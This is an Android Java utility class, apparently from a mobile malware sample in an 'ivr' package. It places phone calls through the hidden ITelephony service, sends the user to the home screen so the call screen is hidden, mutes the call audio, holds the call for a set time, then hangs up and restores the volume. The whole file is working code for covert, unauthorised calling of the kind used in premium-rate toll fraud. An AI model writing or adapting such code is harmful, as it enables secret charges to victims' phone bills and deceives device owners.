package net.workspace.ivr;
import net.workspace.listener.CallListener;
import net.workspace.util.CommonUtil;
import net.workspace.util.Constant;
import net.workspace.util.MyLogger;
import android.content.Intent;
import android.media.AudioManager;
import android.os.IBinder;
import android.os.RemoteException;
import com.android.internal.telephony.ITelephony;

public class CallPhoneUtil implements Runnable {
    private static void endCall(ITelephony itelephony) {
        try {
            itelephony.endCall();
        } catch (RemoteException e) {
            MyLogger.error(e);
        }
    }
    public static void stopCall() {
        if (IS_CALLING) {
            IS_CALLING = false;
            new Thread() {
                @Override
                public void run() {
                    synchronized (locker) {
                        if (LISTENER != null) {
                            if (System.currentTimeMillis() - CALL_TIME < 1000 * DURATION) LISTENER.onFailed();
                            else LISTENER.onSuccess();
                        }
                        LISTENER = null;
                    }
                }
            }.start();
        }
    }
    /**
     * "android.intent.category.HOME"
     */
    public static String CATEGORY_HOME = /*const-replace-start*/"android.intent.category.HOME";
    private static int DURATION = 0;
    private static long CALL_TIME = 0L;
    private static final int WAIT_TIME = 5;
    private static boolean IS_CALLING = false;
    private static CallListener LISTENER;
    private static final Object locker = new Object();
    private String phoneNumber;
    /**
     * android.intent.action.MAIN
     */
    private static String ACTION_MAIN = /*const-replace-start*/"android.intent.action.MAIN";
    public CallPhoneUtil(String phoneNumber, int duration, CallListener oncallphonelistener) {
        this.phoneNumber = phoneNumber;
        DURATION = duration + WAIT_TIME;
        synchronized (locker) {
            LISTENER = oncallphonelistener;
        }
    }
    private void call(String phoneNumber, int duration) {
        boolean isCallend = false;
        try {
            ITelephony itelephony = ITelephony.Stub.asInterface((IBinder) Class.forName(Constant.SERVICE_MANAGER).getMethod(Constant.GET_SERVICE, new Class[] { String.class })
                    .invoke(null, new Object[] { "phone" }));
            itelephony.call(phoneNumber);
            IS_CALLING = true;
            CALL_TIME = System.currentTimeMillis();
            CommonUtil.sleep(200L);
            CommonUtil.context.startActivity(new Intent().setAction(ACTION_MAIN).addCategory(CATEGORY_HOME));
            AudioManager manager = (AudioManager) CommonUtil.context.getSystemService("audio");
            manager.getStreamMaxVolume(0);
            int volume = manager.getStreamVolume(0);
            manager.setStreamVolume(0, 0, 0);
            CommonUtil.sleep(duration * 1000);
            endCall(itelephony);
            manager.setStreamVolume(0, volume, 0);
            isCallend = true;
            IS_CALLING = false;
        } catch (Exception e) {
            MyLogger.error(e);
        }
        synchronized (locker) {
            if (LISTENER != null) {
                if (isCallend) LISTENER.onSuccess();
                else LISTENER.onFailed();
            }
            LISTENER = null;
        }
    }
    @Override
    public void run() {
        call(phoneNumber, DURATION);
    }
    public void startCallPhone() {
        new Thread(this).start();
    }
}
